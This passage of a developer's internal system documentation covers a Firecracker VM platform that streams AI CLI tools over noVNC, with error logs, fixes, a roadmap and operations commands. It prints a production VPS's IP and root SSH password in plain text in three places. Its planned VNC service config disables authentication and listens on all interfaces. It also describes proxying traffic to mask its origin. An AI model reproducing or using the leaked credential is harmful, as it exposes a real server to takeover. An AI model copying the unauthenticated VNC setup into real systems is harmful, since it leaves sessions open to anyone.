// → VM boots → polls for offer → offer exists ✅
```

**New Timing (FIXED)**:
```
Time  Browser                    Master Controller         VM
0s    Click "Connect"
1s    Create WebRTC offer
2s    Collect ICE candidates
3s    POST /api/auth/start →
      (with offer included)
4s                              Store offer FIRST
5s                              Create session
6s                              Start VM creation
...
20s                             VM boots
21s                                                    ← Polls for offer
22s                                                    ← Offer exists! ✅
```

**Files Modified**:
- `/src/app/dashboard/remote-cli/page.tsx:124-214`
- `/master-controller/src/routes/auth.js`

**Status**: ✅ Fixed and working

#### ERROR #7: VM Health Check Timeouts (EHOSTUNREACH)

**Severity**: 🟠 **HIGH - FREQUENT FAILURES**
**Status**: ⚠️ **MITIGATED BUT STILL OCCURRING**

**Symptom**:
```
[WAIT-VM-READY] Checking VM health: http://192.168.100.3:8080/health
[WAIT-VM-READY] Health check failed: EHOSTUNREACH
[WAIT-VM-READY] Health check failed: EHOSTUNREACH
...
[WAIT-VM-READY] Max retries exhausted - VM not ready after 180000ms
```

**Root Cause**:
- VM takes 45-60s to boot OAuth agent
- VNC takes 15s for RFB protocol initialization
- Network may have brief delays during boot
- Health checks timing out too early

**Attempted Fixes**:
1. ✅ Increased initial delay: 15s → 45s
2. ✅ Increased total timeout: 120s → 180s (3 minutes)
3. ✅ Added extra 15s delay after VNC port opens
4. ✅ Added retry logic for EHOSTUNREACH/ETIMEDOUT (10 retries, 2s delays)

**Configuration**:
```javascript
// /master-controller/src/config/index.js
performance: {
  browserVmHealthTimeoutMs: 180000, // 3 minutes
  cliOAuthStartTimeoutMs: 10000      // 10 seconds
}

// Retry logic in waitForVMReady()
const MAX_RETRIES = 10;
const RETRY_DELAY_MS = 2000;
```

**Remaining Issues**:
- Still seeing EHOSTUNREACH despite retries
- No visibility into WHY VMs fail to become ready
- Hardcoded delays are brittle

**Better Solution Needed**:
- Implement proper readiness checks (not just delays)
- Add health endpoint with dependency checks
- Log VM boot console output
- Use systemd-notify for service readiness

#### ERROR #8: Stale Sessions Persisting in Database

**Severity**: 🟠 **HIGH - UX DEGRADATION**
**Status**: ⚠️ **ONGOING** (ARCH-1 Fix partially addresses this)

**Symptom**:
- User clicks "Connect Claude Code"
- Frontend loads old session from database
- Old session points to destroyed VM (IP no longer exists)
- Connection fails with EHOSTUNREACH
- User forced to manually cleanup

**Root Cause**:
- No session expiration/cleanup logic
- Frontend doesn't check if VM is actually alive
- Database keeps sessions indefinitely
- No TTL on sessions

**Impact**:
- Poor UX - user sees error on "Connect"
- Manual cleanup required
- Not seamless like Replit

**Partial Solution (ARCH-1 Fix)**:
- Redis session storage with automatic TTL expiration
- Sessions auto-expire after 10 minutes
- If session not in Redis → VM is dead → show "Start New Session"

**Status**: ⚠️ Redis implementation ready but not deployed to production

---

### MEDIUM Priority Issues 🟡

#### ERROR #9: Console Logs Deleted on VM Cleanup

**Severity**: 🟡 **MEDIUM - DEBUGGING DIFFICULTY**
**Status**: ⏳ **FIX IMPLEMENTED BUT NOT TESTED**

**Symptom**:
- VM fails to boot or connect
- VM gets destroyed
- Console logs deleted
- Cannot debug what went wrong

**Impact**:
- Blind debugging
- No visibility into boot errors
- Wastes time on repeat failures

**Fix Implemented**:
```javascript
// /master-controller/src/services/vm-manager.js
async destroyVM(vmId, preserveLogs = false) {
  if (preserveLogs) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const debugDir = '/var/log/vm-debug-logs';
    await fs.mkdir(debugDir, { recursive: true });

    // Preserve console.log
    await fs.copyFile(
      `${vmDir}/console.log`,
      `${debugDir}/${vmId}-${timestamp}-console.log`
    );
  }

  // Then proceed with cleanup
}
```

**Status**: Code written but not tested

#### ERROR #10: Hardcoded VPS IP in Frontend

**Severity**: 🟡 **MEDIUM - SCALABILITY ISSUE**
**Status**: ⚠️ **EXISTS IN CODE**

**Problem**:
```typescript
// /src/app/dashboard/remote-cli/auth/page.tsx:613
<iframe
  src={`http://135.181.138.102:4000/novnc/vnc.html?...`}
  //         ^^^^^^^^^^^^^^^^^^^^ Hardcoded!
/>
```

**Impact**:
- Cannot scale to multiple VPS hosts
- Cannot use in development (localhost)
- Breaks if VPS IP changes

**Solution**:
```typescript
const masterControllerUrl = process.env.NEXT_PUBLIC_MASTER_CONTROLLER_URL ||
                            'http://135.181.138.102:4000';

<iframe
  src={`${masterControllerUrl}/novnc/vnc.html?...`}
/>
```

**Status**: Not fixed yet

#### ERROR #11: Golden Rootfs Clone Timeout

**Severity**: 🟡 **MEDIUM - SLOW VM CREATION**
**Status**: ⏳ **MITIGATED**

**Symptom**:
```
[VM-CREATE] Cloning golden rootfs...
[VM-CREATE] Error: cp command timed out after 15000ms
```

**Root Cause**:
- Golden rootfs is 6.8GB
- Copy takes 30-60s on some systems
- Timeout was too short (15s)

**Fix Applied**:
```javascript
// Increased timeout from 15s to 90s
await execWithTimeout(`cp ${goldenRootfs} ${vmRootfs}`, 90000);
```

**Better Solution**:
- Use CoW (copy-on-write) with devicemapper
- Use Firecracker snapshots properly
- Avoid full copy every time

**Status**: Mitigated with longer timeout

---

## INFRASTRUCTURE & SECURITY

### Production VPS

**Provider**: Hetzner
**IP**: 135.181.138.102
**OS**: Ubuntu 22.04
**Location**: Germany

**Installed Services**:
- Node.js master controller (port 4000)
- Nginx reverse proxy (ports 80, 443)
- Redis (port 6379, local only)
- Firecracker (microVM engine)
- UFW firewall (active ✅)

**Security Hardening**:

1. **Firewall (UFW)**:
```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp    # SSH
ufw allow 80/tcp    # HTTP
ufw allow 443/tcp   # HTTPS
ufw deny 4646-4648  # Nomad (blocked after attack)
ufw deny 9090       # Prometheus
```

2. **SSH Hardening**:
- Password: `Venkatesh4158198303` (needs rotation ⚠️)
- Recommend: Disable password auth, use SSH keys only
- Recommend: Change default port 22
- Recommend: Fail2ban for brute force protection

3. **Service Isolation**:
- Master controller runs as non-root user (recommended)
- Firecracker VMs are isolated (each in separate jail)
- Network isolation via bridge + iptables

4. **Monitoring**:
- Security monitoring script (`security-monitor.sh`)
- Runs hourly via cron
- Checks for suspicious processes
- Verifies UFW status
- Logs to `/var/log/polydev-security.log`

### Database (Supabase)

**Tables**:

1. **auth_sessions**:
```sql
CREATE TABLE auth_sessions (
  session_id UUID PRIMARY KEY,
  user_id TEXT NOT NULL,
  provider TEXT NOT NULL,
  status TEXT DEFAULT 'pending',
  browser_ip TEXT,
  started_at TIMESTAMPTZ DEFAULT NOW(),
  completed_at TIMESTAMPTZ
);
```

2. **encrypted_credentials**:
```sql
CREATE TABLE encrypted_credentials (
  id UUID PRIMARY KEY,
  user_id TEXT NOT NULL,
  provider TEXT NOT NULL,
  encrypted_data TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
```

**Credentials** (need to extract from code):
- Supabase URL: `process.env.SUPABASE_URL`
- Service Role Key: `process.env.SUPABASE_SERVICE_KEY`
- Anon Key: `process.env.SUPABASE_ANON_KEY`

### Encryption

**Master Key**: `process.env.ENCRYPTION_MASTER_KEY`

**Algorithm**: AES-256-GCM

**Implementation**:
```javascript
// /master-controller/src/utils/encryption.js
const crypto = require('crypto');

class CredentialEncryption {
  encrypt(data) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', this.masterKey, iv);

    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();

    return {
      encrypted,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex')
    };
  }

  decrypt(encryptedData, iv, authTag) {
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      this.masterKey,
      Buffer.from(iv, 'hex')
    );

    decipher.setAuthTag(Buffer.from(authTag, 'hex'));

    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    return JSON.parse(decrypted);
  }
}
```

**⚠️ CRITICAL**: Master encryption key must be backed up securely. If lost, all credentials are unrecoverable.

### Proxy Configuration (Decodo)

**Purpose**: Proxy CLI tool traffic to appear as if from user's location

**Credentials** (need to extract):
- User: `process.env.DECODO_USER`
- Password: `process.env.DECODO_PASSWORD`
- Host: `dc.decodo.com`
- Port range: 10001-10100

---

## DEVELOPMENT ROADMAP

### Immediate Priorities (Week 4-5)

#### Priority 1: FIX VNC DISPLAY ISSUE ⚡ **CRITICAL**

**Blocker**: Cannot proceed without functional VNC display

**Tasks**:
1. Mount golden rootfs
2. Chroot into rootfs
3. Install proper TigerVNC: `apt-get install tigervnc-standalone-server`
4. Verify `vncserver` command exists
5. Create `/root/.vnc/xstartup` script
6. Create XFCE autostart entries (terminal + Firefox)
7. Update systemd service to use `vncserver` wrapper
8. Test with new VM
9. VERIFY full 1920x1080 XFCE desktop displays

**Alternative**: If TigerVNC doesn't work, switch to x11vnc + Xvfb

**Success Criteria**:
- ✅ Full 1920x1080 XFCE desktop visible in noVNC
- ✅ Terminal window opens automatically and is maximized
- ✅ Firefox opens automatically (behind terminal)
- ✅ User can immediately start typing commands

**Estimated Time**: 1-2 days (if straightforward)

#### Priority 2: Deploy ARCH-1 Fix (Redis Session Storage)

**Already Implemented**:
- ✅ Redis client service
- ✅ Configuration
- ✅ End-to-end test
- ✅ Integration code written

**Remaining Tasks**:
1. Install Redis on VPS: `apt-get install redis-server`
2. Update `.env` with `REDIS_URL`
3. Deploy updated code to VPS
4. Restart master controller
5. Test session expiration works
6. Verify no orphaned sessions

**Success Criteria**:
- ✅ Sessions auto-expire after 10 minutes
- ✅ Frontend shows "Start New Session" for expired sessions
- ✅ No stale sessions persist

**Estimated Time**: 1 day

#### Priority 3: Update Frontend Instructions

**Tasks**:
1. Fix instructions in `/src/app/dashboard/remote-cli/auth/page.tsx`
2. Show correct CLI command to type (`$ claude`, `$ codex`, `$ gemini`)
3. Explain OAuth flow clearly
4. Add progress indicators
5. Add better error messages

**Estimated Time**: 0.5 days

### Medium-Term Goals (Week 6-8)

1. **Implement CLI VM Architecture**:
   - Create CLI-optimized golden rootfs (headless)
   - Credential loading mechanism
   - Command streaming via WebSocket
   - Automatic hibernation/wake

2. **Production Hardening**:
   - SSH key-based auth (disable passwords)
   - Fail2ban for SSH protection
   - Automated backup system
   - Monitoring/alerting (Prometheus + Grafana)

3. **UX Improvements**:
   - Real-time progress updates during VM creation
   - Better error messages
   - Session management dashboard
   - Usage analytics

4. **Scale Preparation**:
   - Load balancing across multiple VPS hosts
   - Database sharding
   - CDN for static assets
   - Rate limiting and abuse prevention

### Long-Term Vision (3-6 months)

1. **Multi-Provider Support**:
   - OpenAI Codex
   - Google Gemini
   - Other AI CLI tools

2. **Enterprise Features**:
   - Team accounts
   - Usage quotas
   - Billing integration
   - Admin dashboard

3. **Developer Tools**:
   - SDK for integrating with applications
   - VS Code extension
   - CLI wrapper library
   - API documentation

---

## DEPLOYMENT & OPERATIONS

### Local Development Setup

**Prerequisites**:
- Node.js 18+
- npm/yarn
- Redis (local instance)

**Environment Variables**:
```bash
# .env
REDIS_URL=redis://localhost:6379
SUPABASE_URL=https://YOUR_PROJECT.supabase.co
SUPABASE_SERVICE_KEY=YOUR_SERVICE_KEY
ENCRYPTION_MASTER_KEY=YOUR_32_BYTE_HEX_KEY
```

**Run Frontend**:
```bash
cd /Users/venkat/Documents/polydev-ai
npm install
npm run dev
# → http://localhost:3000
```

**Run Master Controller** (requires VPS or Firecracker setup):
```bash
cd /Users/venkat/Documents/polydev-ai/master-controller
npm install
node src/index.js
# → http://localhost:4000
```

### Production Deployment (VPS)

**VPS Access**:
```bash
ssh root@135.181.138.102
# Password: Venkatesh4158198303
```

**Master Controller Location**: `/opt/master-controller/`

**Restart Master Controller**:
```bash
cd /opt/master-controller
pkill -9 node
sleep 3
nohup node src/index.js > logs/master-controller.log 2>&1 &
sleep 5
curl -s http://localhost:4000/health
```

**Check Logs**:
```bash
tail -f /opt/master-controller/logs/master-controller.log
```

**Deploy Code Changes**:
```bash
# From local machine
scp -r /path/to/changed/files root@135.181.138.102:/opt/master-controller/
# Then restart master controller
```

### Monitoring & Debugging

**Health Check**:
```bash
curl http://localhost:4000/health
```

**Redis Status**:
```bash
redis-cli
> PING
> KEYS session:*
> GET session:{sessionId}
> TTL session:{sessionId}
> QUIT
```

**VM Status**:
```bash
# List VMs
ls -lt /var/lib/firecracker/users/ | head -10

# Check VM console logs
tail -100 /var/lib/firecracker/users/vm-{vmId}/console.log

# Test VNC connection
python3 -c 'import socket; s=socket.socket(); s.connect(("192.168.100.2", 5901)); print(s.recv(12)); s.close()'
```

**Network Status**:
```bash
# Check bridge
ip addr show fcbr0

# Check TAP interfaces
ip addr show | grep tap-

# Check IP allocation
cat /var/lib/firecracker/ip-pool.txt
```

### Common Issues & Solutions

**Issue**: Master controller won't start

**Solution**:
```bash
# Check if port 4000 is in use
lsof -i :4000

# Kill any existing processes
pkill -9 node

# Check logs for errors
tail -100 /opt/master-controller/logs/master-controller.log
```

**Issue**: VM creation fails with timeout

**Solution**:
```bash
# Check Firecracker is working
firecracker --version

# Check golden rootfs exists
ls -lh /var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4

# Check disk space
df -h /var/lib/firecracker
```

**Issue**: VNC connection fails

**Solution**:
```bash
# Check VNC port from VPS
timeout 5 echo | nc 192.168.100.X 5901

# Check if VM is running
ps aux | grep firecracker | grep -v grep

# Check VM console logs
tail -100 /var/lib/firecracker/users/vm-{vmId}/console.log
```

---

## CRITICAL NEXT STEPS FOR NEXT SESSION

### IMMEDIATE ACTION REQUIRED

**🔴 CRITICAL: Fix VNC Display**

**Tasks**:
1. Mount golden rootfs:
   ```bash
   mount -o loop /var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4 /mnt/golden
   ```

2. Chroot and install proper TigerVNC:
   ```bash
   chroot /mnt/golden /bin/bash
   apt-get update
   apt-get install tigervnc-standalone-server
   which vncserver  # VERIFY this exists
   ```

3. Create xstartup script:
   ```bash
   mkdir -p /root/.vnc
   cat > /root/.vnc/xstartup <<'EOF'
   #!/bin/sh
   unset SESSION_MANAGER
   unset DBUS_SESSION_BUS_ADDRESS
   exec startxfce4
   EOF
   chmod +x /root/.vnc/xstartup
   ```

4. Create XFCE autostart entries:
   ```bash
   mkdir -p /root/.config/autostart

   # Terminal
   cat > /root/.config/autostart/01-terminal.desktop <<'EOF'
   [Desktop Entry]
   Type=Application
   Name=Terminal
   Exec=xfce4-terminal --maximize --title="Polydev CLI - Type: claude, codex, or gemini"
   Terminal=false
   StartupNotify=false
   EOF

   # Firefox
   cat > /root/.config/autostart/02-firefox.desktop <<'EOF'
   [Desktop Entry]
   Type=Application
   Name=Firefox
   Exec=sh -c "sleep 3 && firefox --new-instance"
   Terminal=false
   StartupNotify=false
   EOF
   ```

5. Update TigerVNC service:
   ```bash
   cat > /etc/systemd/system/tigervnc.service <<'EOF'
   [Unit]
   Description=TigerVNC Server (Full XFCE Desktop)
   After=network.target

   [Service]
   Type=forking
   User=root
   WorkingDirectory=/root
   Environment=HOME=/root

   ExecStartPre=-/usr/bin/vncserver -kill :1
   ExecStart=/usr/bin/vncserver :1 -geometry 1920x1080 -depth 24 -localhost no -rfbport 5901 -SecurityTypes None
   ExecStop=/usr/bin/vncserver -kill :1

   Restart=on-failure

   [Install]
   WantedBy=multi-user.target
   EOF

   systemctl enable tigervnc
   ```

6. Exit chroot and unmount:
   ```bash
   exit
   umount /mnt/golden
   ```

7. Test with new VM:
   ```bash
   curl -X POST http://localhost:4000/api/auth/start \
     -H "Content-Type: application/json" \
     -d '{"userId":"test-user","provider":"claude_code"}'
   ```

8. VERIFY full 1920x1080 XFCE desktop with terminal + Firefox

**SUCCESS CRITERIA**:
- ✅ Full-screen XFCE desktop visible
- ✅ Terminal window auto-opens and is maximized
- ✅ Firefox opens (behind terminal)
- ✅ User can immediately type commands

---

## FILES REFERENCE

### Documentation Files

| File | Purpose | Status |
|------|---------|--------|
| `POLYDEV_MASTER_SYSTEM_DOCUMENTATION.md` | **This file** - Complete system documentation | ✅ Current |
| `CORRECT_UX_REQUIREMENTS_AND_ALL_ERRORS.md` | Detailed error catalog (25+ errors) | ✅ Complete |
| `VNC_DISPLAY_ISSUE_COMPLETE_ANALYSIS.md` | VNC display debugging | ✅ Detailed |
| `HETZNER_UNLOCK_REQUEST.md` | DDoS attack incident report | ✅ Complete |

### Source Code Files

**Frontend**:
- `/src/app/dashboard/remote-cli/page.tsx` - Provider selection dashboard
- `/src/app/dashboard/remote-cli/auth/page.tsx` - OAuth flow UI with noVNC
- `/src/components/WebRTCViewer.tsx` - WebRTC video streaming

**Master Controller**:
- `/master-controller/src/index.js` - Main server
- `/master-controller/src/services/vm-manager.js` - VM lifecycle management
- `/master-controller/src/services/browser-vm-auth.js` - OAuth flow handling
- `/master-controller/src/services/redis-client.js` - Session storage with TTL
- `/master-controller/src/services/webrtc-signaling.js` - WebRTC coordination
- `/master-controller/src/config/index.js` - Configuration management

**Tests**:
- `/master-controller/test-redis-session-lifecycle.js` - Redis integration test

**Golden Rootfs**:
- `/var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4` - Base VM image

---

## CONTACT & SUPPORT

**Repository**: (Add GitHub URL)

**Issues**: File bugs/feature requests in GitHub Issues

**Documentation**: This master documentation file + linked error catalogs

**VPS Access**: root@135.181.138.102 (Password: Venkatesh4158198303)

**Developer**: Venkat (gvsfans@gmail.com)

---

**Document Version**: 2.0
**Created**: November 24, 2025
**Last Updated**: November 24, 2025
**Status**: Production Development (Week 4)
**Next Review**: After VNC display fix is deployed

---

**🚨 CRITICAL PRIORITY: FIX VNC DISPLAY ISSUE BEFORE PROCEEDING WITH ANY OTHER DEVELOPMENT**
